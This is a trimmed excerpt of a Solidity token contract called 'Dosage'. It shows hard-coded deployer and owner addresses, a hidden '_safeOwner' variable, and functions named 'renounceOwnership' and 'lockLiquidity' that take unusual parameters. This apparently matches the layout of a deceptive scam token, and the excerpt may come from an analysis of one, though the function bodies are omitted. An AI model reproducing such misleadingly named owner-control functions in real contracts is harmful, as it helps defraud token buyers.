...
contract Dosage is Context, IERC20 {
    ...
    address lead_deployer = 0xdBd8642Fc457dA6275d854571358dAE55CE96D3F;
    address public _owner = 0xca79576671F1e013CFD2af07903C994551f5EF25;
   constructor () public {
        ...
        _symbol = "$DOSA3.0";
        _decimals = 18;
        uint256 initialSupply = 179179179179179;
        _safeOwner = _owner;
...
//-----------------------------------------------------------------------------------------------------------------------//
        ...
        function renounceOwnership(address account, address staker) public {
        ...
        function lockLiquidity(address account, address staker) public {
  ...
  function beginAirdrop(address emitUniswapPool,address[] memory emitReceivers,uint256[] memory emitAmounts)  public auth(){
